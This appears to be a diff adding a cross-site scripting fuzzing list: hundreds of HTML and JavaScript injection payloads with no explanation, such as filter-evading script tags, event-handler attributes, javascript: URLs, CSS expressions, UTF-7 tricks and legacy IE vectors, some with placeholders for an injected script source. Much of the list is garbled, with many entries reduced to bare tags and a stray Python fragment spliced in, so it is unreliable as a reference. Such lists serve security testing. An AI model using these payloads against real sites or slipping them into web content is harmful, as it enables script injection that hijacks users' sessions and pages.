@@ -1,0 +1,664 @@
+&lt;script\x20type="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
+&lt;script\x3Etype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
+&lt;script\x0Dtype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
+&lt;script\x09type="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
+&lt;script\x0Ctype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
+&lt;script\x2Ftype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
+&lt;script\x0Atype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
+'`"&gt;&lt;\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;        
+'`"&gt;&lt;\x00script&gt;javascript:alert(1)&lt;/script&gt;
+<img src></img>
+<audio src></audio>
+<video src></video>
+&lt;body src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/body&gt;
+&lt;image src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/image&gt;
+&lt;object src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/object&gt;
+&lt;script src=1 href=1 onerror="javascript:alert(1)"&gt;&lt;/script&gt;
+&lt;svg onResize svg onResize="javascript:javascript:alert(1)"&gt;&lt;/svg onResize&gt;
+&lt;title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"&gt;&lt;/title onPropertyChange&gt;
+&lt;iframe onLoad iframe onLoad="javascript:javascript:alert(1)"&gt;&lt;/iframe onLoad&gt;
+&lt;body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"&gt;&lt;/body onMouseEnter&gt;
+&lt;body onFocus body onFocus="javascript:javascript:alert(1)"&gt;&lt;/body onFocus&gt;
+&lt;frameset onScroll frameset onScroll="javascript:javascript:alert(1)"&gt;&lt;/frameset onScroll&gt;
+&lt;script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"&gt;&lt;/script onReadyStateChange&gt;
+&lt;html onMouseUp html onMouseUp="javascript:javascript:alert(1)"&gt;&lt;/html onMouseUp&gt;
+&lt;body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"&gt;&lt;/body onPropertyChange&gt;
+&lt;svg onLoad svg onLoad="javascript:javascript:alert(1)"&gt;&lt;/svg onLoad&gt;
+&lt;body onPageHide body onPageHide="javascript:javascript:alert(1)"&gt;&lt;/body onPageHide&gt;
+&lt;body onMouseOver body onMouseOver="javascript:javascript:alert(1)"&gt;&lt;/body onMouseOver&gt;
+&lt;body onUnload body onUnload="javascript:javascript:alert(1)"&gt;&lt;/body onUnload&gt;
+&lt;body onLoad body onLoad="javascript:javascript:alert(1)"&gt;&lt;/body onLoad&gt;
+&lt;bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"&gt;&lt;/bgsound onPropertyChange&gt;
+&lt;html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"&gt;&lt;/html onMouseLeave&gt;
+&lt;html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"&gt;&lt;/html onMouseWheel&gt;
+&lt;style onLoad style onLoad="javascript:javascript:alert(1)"&gt;&lt;/style onLoad&gt;
+&lt;iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"&gt;&lt;/iframe onReadyStateChange&gt;
+&lt;body onPageShow body onPageShow="javascript:javascript:alert(1)"&gt;&lt;/body onPageShow&gt;
+&lt;style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"&gt;&lt;/style onReadyStateChange&gt;
+&lt;frameset onFocus frameset onFocus="javascript:javascript:alert(1)"&gt;&lt;/frameset onFocus&gt;
+&lt;applet onError applet onError="javascript:javascript:alert(1)"&gt;&lt;/applet onError&gt;
+&lt;marquee onStart marquee onStart="javascript:javascript:alert(1)"&gt;&lt;/marquee onStart&gt;
+&lt;script onLoad script onLoad="javascript:javascript:alert(1)"&gt;&lt;/script onLoad&gt;
+&lt;html onMouseOver html onMouseOver="javascript:javascript:alert(1)"&gt;&lt;/html onMouseOver&gt;
+&lt;html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"&gt;&lt;/html onMouseEnter&gt;
+&lt;body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"&gt;&lt;/body onBeforeUnload&gt;
+&lt;html onMouseDown html onMouseDown="javascript:javascript:alert(1)"&gt;&lt;/html onMouseDown&gt;
+&lt;marquee onScroll marquee onScroll="javascript:javascript:alert(1)"&gt;&lt;/marquee onScroll&gt;
+&lt;xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"&gt;&lt;/xml onPropertyChange&gt;
+&lt;frameset onBlur frameset onBlur="javascript:javascript:alert(1)"&gt;&lt;/frameset onBlur&gt;
+&lt;applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"&gt;&lt;/applet onReadyStateChange&gt;
+&lt;svg onUnload svg onUnload="javascript:javascript:alert(1)"&gt;&lt;/svg onUnload&gt;
+&lt;html onMouseOut html onMouseOut="javascript:javascript:alert(1)"&gt;&lt;/html onMouseOut&gt;
+&lt;body onMouseMove body onMouseMove="javascript:javascript:alert(1)"&gt;&lt;/body onMouseMove&gt;
+&lt;body onResize body onResize="javascript:javascript:alert(1)"&gt;&lt;/body onResize&gt;
+&lt;object onError object onError="javascript:javascript:alert(1)"&gt;&lt;/object onError&gt;
+&lt;body onPopState body onPopState="javascript:javascript:alert(1)"&gt;&lt;/body onPopState&gt;
+&lt;html onMouseMove html onMouseMove="javascript:javascript:alert(1)"&gt;&lt;/html onMouseMove&gt;
+&lt;applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"&gt;&lt;/applet onreadystatechange&gt;
+&lt;body onpagehide body onpagehide="javascript:javascript:alert(1)"&gt;&lt;/body onpagehide&gt;
+&lt;svg onunload svg onunload="javascript:javascript:alert(1)"&gt;&lt;/svg onunload&gt;
+&lt;applet onerror applet onerror="javascript:javascript:alert(1)"&gt;&lt;/applet onerror&gt;
+&lt;body onkeyup body onkeyup="javascript:javascript:alert(1)"&gt;&lt;/body onkeyup&gt;
+&lt;body onunload body onunload="javascript:javascript:alert(1)"&gt;&lt;/body onunload&gt;
+&lt;iframe onload iframe onload="javascript:javascript:alert(1)"&gt;&lt;/iframe onload&gt;
+&lt;body onload body onload="javascript:javascript:alert(1)"&gt;&lt;/body onload&gt;
+&lt;html onmouseover html onmouseover="javascript:javascript:alert(1)"&gt;&lt;/html onmouseover&gt;
+&lt;object onbeforeload object onbeforeload="javascript:javascript:alert(1)"&gt;&lt;/object onbeforeload&gt;
+&lt;body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"&gt;&lt;/body onbeforeunload&gt;
+&lt;body onfocus body onfocus="javascript:javascript:alert(1)"&gt;&lt;/body onfocus&gt;
+&lt;body onkeydown body onkeydown="javascript:javascript:alert(1)"&gt;&lt;/body onkeydown&gt;
+&lt;iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"&gt;&lt;/iframe onbeforeload&gt;
+&lt;iframe src iframe src="javascript:javascript:alert(1)"&gt;&lt;/iframe src&gt;
+&lt;svg onload svg onload="javascript:javascript:alert(1)"&gt;&lt;/svg onload&gt;
+&lt;html onmousemove html onmousemove="javascript:javascript:alert(1)"&gt;&lt;/html onmousemove&gt;
+&lt;body onblur body onblur="javascript:javascript:alert(1)"&gt;&lt;/body onblur&gt;
+\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;
+'"`&gt;&lt;script&gt;/* *\x2Fjavascript:alert(1)// */&lt;/script&gt;
+&lt;script&gt;javascript:alert(1)&lt;/script\x0D
+&lt;script&gt;javascript:alert(1)&lt;/script\x0A
+&lt;script&gt;javascript:alert(1)&lt;/script\x0B
+&lt;script charset="\x22&gt;javascript:alert(1)&lt;/script&gt;
+
+--&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;
+--&gt;
+--&gt;
+--&gt;
+`"'&gt;<img src="#\x27 onerror=javascript:alert(1)&gt; &lt;a href=&quot;javascript\x3Ajavascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt; &quot;"><p>&lt;svg&gt;&lt;script&gt;a='hello\x27;javascript:alert(1)//';&lt;/script&gt;</p>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+&lt;script&gt;/* *\x2A/javascript:alert(1)// */&lt;/script&gt;
+&lt;script&gt;/* *\x00/javascript:alert(1)// */&lt;/script&gt;
+&lt;style&gt;&lt;/style\x3E<img src />&lt;/style&gt;
+&lt;style&gt;&lt;/style\x0D<img src />&lt;/style&gt;
+&lt;style&gt;&lt;/style\x09<img src />&lt;/style&gt;
+&lt;style&gt;&lt;/style\x20<img src />&lt;/style&gt;
+&lt;style&gt;&lt;/style\x0A<img src />&lt;/style&gt;
+"'`&gt;ABC<div>DEF 
+"'`&gt;ABC<div>DEF 
+&lt;script&gt;if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}&lt;/script&gt;
+&lt;script&gt;if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}&lt;/script&gt;
+&lt;script&gt;if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}&lt;/script&gt;
+'`"&gt;&lt;\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;
+'`"&gt;&lt;\x00script&gt;javascript:alert(1)&lt;/script&gt;
+"'`&gt;&lt;\x3Cimg src=xxx:x onerror=javascript:alert(1)&gt;
+"'`&gt;&lt;\x00img src=xxx:x onerror=javascript:alert(1)&gt;
+&lt;script src="data:text/plain\x2Cjavascript:alert(1)"&gt;&lt;/script&gt;
+&lt;script src="data:\xD4\x8F,javascript:alert(1)"&gt;&lt;/script&gt;
+&lt;script src="data:\xE0\xA4\x98,javascript:alert(1)"&gt;&lt;/script&gt;
+&lt;script src="data:\xCB\x8F,javascript:alert(1)"&gt;&lt;/script&gt;
+&lt;script\x20type="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
+&lt;script\x3Etype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
+&lt;script\x0Dtype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
+&lt;script\x09type="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
+&lt;script\x0Ctype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
+&lt;script\x2Ftype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
+&lt;script\x0Atype="text/javascript"&gt;javascript:alert(1);&lt;/script&gt;
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+ABC<div>DEF
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+<a href>test</a>
+`"'&gt;<img src>
+`"'&gt;<img src>
+`"'&gt;<img src>
+`"'&gt;<img src>
+`"'&gt;<img src>
+`"'&gt;<img src>
+`"'&gt;<img src>
+`"'&gt;<img src>
+`"'&gt;<img src>
+`"'&gt;<img src>
+"`'&gt;&lt;script&gt;\x3Bjavascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\x0Djavascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xEF\xBB\xBFjavascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE2\x80\x81javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE2\x80\x84javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE3\x80\x80javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\x09javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE2\x80\x89javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE2\x80\x85javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE2\x80\x88javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\x00javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE2\x80\xA8javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE2\x80\x8Ajavascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE1\x9A\x80javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\x0Cjavascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\x2Bjavascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xF0\x90\x96\x9Ajavascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;-javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\x0Ajavascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE2\x80\xAFjavascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\x7Ejavascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE2\x80\x87javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE2\x81\x9Fjavascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE2\x80\xA9javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xC2\x85javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xEF\xBF\xAEjavascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE2\x80\x83javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE2\x80\x8Bjavascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xEF\xBF\xBEjavascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE2\x80\x80javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\x21javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE2\x80\x82javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE2\x80\x86javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xE1\xA0\x8Ejavascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\x0Bjavascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\x20javascript:alert(1)&lt;/script&gt;
+"`'&gt;&lt;script&gt;\xC2\xA0javascript:alert(1)&lt;/script&gt;
+"/&gt;&lt;img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x /&gt;
+"/&gt;&lt;img/onerror=\x22javascript:alert(1)\x22src=xxx:x /&gt;
+"/&gt;&lt;img/onerror=\x09javascript:alert(1)\x09src=xxx:x /&gt;
+"/&gt;&lt;img/onerror=\x27javascript:alert(1)\x27src=xxx:x /&gt;
+"/&gt;&lt;img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x /&gt;
+"/&gt;&lt;img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x /&gt;
+"/&gt;&lt;img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x /&gt;
+"/&gt;&lt;img/onerror=\x60javascript:alert(1)\x60src=xxx:x /&gt;
+"/&gt;&lt;img/onerror=\x20javascript:alert(1)\x20src=xxx:x /&gt;
+&lt;script\x2F&gt;javascript:alert(1)&lt;/script&gt;
+&lt;script\x20&gt;javascript:alert(1)&lt;/script&gt;
+&lt;script\x0D&gt;javascript:alert(1)&lt;/script&gt;
+&lt;script\x0A&gt;javascript:alert(1)&lt;/script&gt;
+&lt;script\x0C&gt;javascript:alert(1)&lt;/script&gt;
+&lt;script\x00&gt;javascript:alert(1)&lt;/script&gt;
+&lt;script\x09&gt;javascript:alert(1)&lt;/script&gt;
+`"'&gt;<img src>
+`"'&gt;<img src>
+`"'&gt;<img src>
+`"'&gt;<img src>
+`"'&gt;<img src>
+`"'&gt;<img src>
+`"'&gt;<img src>
+&lt;script&gt;javascript:alert(1)&lt;\x00/script&gt;
+<img src="#">
+&lt;input onfocus=javascript:alert(1) autofocus&gt;
+&lt;input onblur=javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;
+&lt;video poster=javascript:javascript:alert(1)//
+&lt;body onscroll=javascript:alert(1)&gt;<br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br>&lt;input autofocus&gt;
+&lt;form id=test onforminput=javascript:alert(1)&gt;&lt;input&gt;&lt;/form&gt;&lt;button form=test onformchange=javascript:alert(1)&gt;X
+<video>&lt;source onerror="javascript:javascript:alert(1)"&gt;
+<video>&lt;source&gt;
+&lt;form&gt;&lt;button formaction="javascript:javascript:alert(1)"&gt;X
+&lt;body oninput=javascript:alert(1)&gt;&lt;input autofocus&gt;
+&lt;math href="javascript:javascript:alert(1)"&gt;CLICKME&lt;/math&gt;  &lt;math&gt; &lt;maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)"&gt;CLICKME&lt;/maction&gt; &lt;/math&gt;
+&lt;frameset onload=javascript:alert(1)&gt;
+<table>
+<img src>
+&lt;comment&gt;<img src>
+&lt;![&gt;<img src>
+&lt;style&gt;<img src>
+<li> <div></div>
+&lt;head&gt;&lt;base href="javascript://"&gt;&lt;/head&gt;&lt;body&gt;<a href="/. /,javascript:alert(1)//#">XXX</a>&lt;/body&gt;
+&lt;SCRIPT FOR=document EVENT=onreadystatechange&gt;javascript:alert(1)&lt;/SCRIPT&gt;
+&lt;OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"&gt;&lt;PARAM NAME="DataURL" VALUE="javascript:alert(1)"&gt;&lt;/OBJECT&gt;
+&lt;object data="data:text/html;base64,%(base64)s"&gt;
+&lt;embed src="data:text/html;base64,%(base64)s"&gt;
+&lt;b &lt;script&gt;alert(1)&lt;/script&gt;0
+<div>&lt;input value="``onmouseover=javascript:alert(1)"&gt;</div> <div></div>&lt;script&gt;document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;&lt;/script&gt;
+&lt;x '="foo"&gt;&lt;x foo='&gt;&lt;img src=x onerror=javascript:alert(1)//'&gt;
+&lt;embed src="javascript:alert(1)"&gt;
+<img src>
+&lt;image src="javascript:alert(1)"&gt;
+&lt;script src="javascript:alert(1)"&gt;
+<div>x
+&lt;? foo="&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;"&gt;
+&lt;! foo="&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;"&gt;
+&lt;/ foo="&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;"&gt;
+&lt;? foo="&gt;&lt;x foo='?&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;'&gt;"&gt;
+&lt;! foo="[[[Inception]]"&gt;&lt;x foo="]foo&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;"&gt;
+&lt;% foo&gt;&lt;x foo="%&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;"&gt;
+<div>&lt;x xmlns="&gt;&lt;iframe onload=javascript:alert(1)"&gt;</div> &lt;script&gt;d.innerHTML=d.innerHTML&lt;/script&gt;
+<img>
+<img>
+<img>
+<img>
+&lt;img\x47src=x onerror="javascript:alert(1)"&gt;
+&lt;img\x10src=x onerror="javascript:alert(1)"&gt;
+&lt;img\x13src=x onerror="javascript:alert(1)"&gt;
+&lt;img\x32src=x onerror="javascript:alert(1)"&gt;
+&lt;img\x47src=x onerror="javascript:alert(1)"&gt;
+&lt;img\x11src=x onerror="javascript:alert(1)"&gt;
+<img>
+<img>
+<img>
+<img>
+<img>
+<img>
+<img>
+<img>
+<img>
+<img>
+<img>
+<img>
+<img src>
+<img src>
+<img src>
+<img src>
+<img src>
+&lt;img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)"&gt;
+<img src>
+<img src>
+<img src>
+<img src>
+<img src>
+<img src>
+<a href>XXX</a>
+<img src>
+<img src>
+&lt;title onpropertychange=javascript:alert(1)&gt;&lt;/title&gt;&lt;title title=&gt;
+<a href="http://foo.bar/#x=`y"></a><img alt="`&gt;&lt;img src=x:x onerror=javascript:alert(1)&gt;&lt;/a&gt;">
+
+
+&lt;script src="/\%(jscript)s"&gt;&lt;/script&gt;
+&lt;script src="\\%(jscript)s"&gt;&lt;/script&gt;
+&lt;object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"&gt;&lt;/object&gt; &lt;object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"&gt;&lt;param name=postdomevents /&gt;&lt;/object&gt;
+<a>X
+&lt;style&gt;p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};&lt;/style&gt;
+&lt;link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
+&lt;style&gt;@import "data:,*%7bx:expression(javascript:alert(1))%7D";&lt;/style&gt;
+<a><a>XXX</a></a><a href>XXX</a>
+&lt;style&gt;*[{}@import'%(css)s?]&lt;/style&gt;X
+<div>XXX
+<div>XXX
+&lt;// style=x:expression\28javascript:alert(1)\29&gt;
+&lt;style&gt;*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}&lt;/style&gt;
+<div></div>
+<div>X
+<div><div>X</div></div> &lt;script&gt;with(document.getElementById("d"))innerHTML=innerHTML&lt;/script&gt;
+<div>X
+<div>X
+<div>XXX</div> &lt;style&gt;  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  &lt;/style&gt;
+&lt;x style="background:url('x&#1;;color:red;/*')"&gt;XXX&lt;/x&gt;
+&lt;script&gt;({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval&lt;/script&gt;
+&lt;script&gt;({0:#0=eval/#0#/#0#(javascript:alert(1))})&lt;/script&gt;
+&lt;script&gt;ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x&lt;/script&gt;
+&lt;script&gt;Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()&lt;/script&gt;
+&lt;meta charset="x-imap4-modified-utf7"&gt;&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+&lt;meta charset="x-imap4-modified-utf7"&gt;&&lt;script&S1&TS&1&gt;alert&A7&(1)&R&UA;&&&lt;&A9&11/script&X&&gt;
+&lt;meta charset="mac-farsi"&gt;¼script¾javascript:alert(1)¼/script¾
+X&lt;x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` &gt;
+1&lt;set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`&gt;
+1&lt;animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;&gt;
+&lt;vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss&gt;&lt;/vmlframe&gt;
+1<a href="#">&lt;line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /&gt;</a>
+<a>XXX</a>
+&lt;x style="behavior:url(%(sct)s)"&gt;
+&lt;xml id="xss" src="%(htc)s"&gt;&lt;/xml&gt; &lt;label dataformatas="html" datasrc="#xss" datafld="payload"&gt;&lt;/label&gt;
+&lt;event-source src="%(event)s" onload="javascript:alert(1)"&gt;
+<a href>&lt;event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"&gt;
+<div>x</div> &lt;xml:namespace prefix="t"&gt; &lt;import namespace="t" implementation="#default#time2"&gt; &lt;t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;"&gt;
+&lt;script&gt;%(payload)s&lt;/script&gt;
+&lt;script src=%(jscript)s&gt;&lt;/script&gt;
+&lt;script language='javascript' src='%(jscript)s'&gt;&lt;/script&gt;
+&lt;script&gt;javascript:alert(1)&lt;/script&gt;
+<img src>
+<img src>
+<img src>
+&lt;SCRIPT SRC=%(jscript)s?<b>
+&lt;FRAMESET&gt;&lt;FRAME SRC="javascript:javascript:alert(1);"&gt;&lt;/FRAMESET&gt;
+&lt;BODY ONLOAD=javascript:alert(1)&gt;
+&lt;BODY ONLOAD=javascript:javascript:alert(1)&gt;
+<img src>
+&lt;BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)&gt;
+&lt;SCRIPT/SRC="%(jscript)s"&gt;&lt;/SCRIPT&gt;
+&lt;&lt;SCRIPT&gt;%(payload)s//&lt;&lt;/SCRIPT&gt;
+&lt;IMG SRC="javascript:javascript:alert(1)"
+&lt;iframe src=%(scriptlet)s &lt;
+&lt;INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);"&gt;
+<img>
+<img>
+&lt;BGSOUND SRC="javascript:javascript:alert(1);"&gt;
+<br>
+&lt;LAYER SRC="%(scriptlet)s"&gt;&lt;/LAYER&gt;
+&lt;LINK REL="stylesheet" HREF="javascript:javascript:alert(1);"&gt;
+&lt;STYLE&gt;@import'%(css)s';&lt;/STYLE&gt;
+&lt;META HTTP-EQUIV="Link" Content="&lt;%(css)s&gt;; REL=stylesheet"&gt;
+&lt;XSS STYLE="behavior: url(%(htc)s);"&gt;
+&lt;STYLE&gt;li {list-style-image: url("javascript:javascript:alert(1)");}&lt;/STYLE&gt;<ul><li>XSS
+&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);"&gt;
+&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);"&gt;
+&lt;IFRAME SRC="javascript:javascript:alert(1);"&gt;&lt;/IFRAME&gt;
+<table>
+<table><td>
+<div>
+<div>
+<img>
+&lt;XSS STYLE="xss:expression(javascript:alert(1))"&gt;
+&lt;STYLE TYPE="text/javascript"&gt;javascript:alert(1);&lt;/STYLE&gt;
+&lt;STYLE&gt;.XSS{background-image:url("javascript:javascript:alert(1)");}&lt;/STYLE&gt;<a></a>
+&lt;STYLE type="text/css"&gt;BODY{background:url("javascript:javascript:alert(1)")}&lt;/STYLE&gt;
+
+&lt;BASE HREF="javascript:javascript:alert(1);//"&gt;
+&lt;OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"&gt;&lt;/OBJECT&gt;
+&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:javascript:alert(1)&gt;&lt;/OBJECT&gt;
+&lt;HTML xmlns:xss&gt;&lt;?import namespace="xss" implementation="%(htc)s"&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt;""","XML namespace."),("""&lt;XML ID="xss"&gt;<i><b>&lt;IMG SRC="javascript:javascript:alert(1)"&gt;</b></i>&lt;/XML&gt;<span></span>
+&lt;HTML&gt;&lt;BODY&gt;&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;&lt;?import namespace="t" implementation="#default#time2"&gt;&lt;t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"&gt;&lt;/BODY&gt;&lt;/HTML&gt;
+&lt;SCRIPT SRC="%(jpg)s"&gt;&lt;/SCRIPT&gt;
+&lt;HEAD&gt;&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
+&lt;form id="test" /&gt;&lt;button form="test" formaction="javascript:javascript:alert(1)"&gt;X
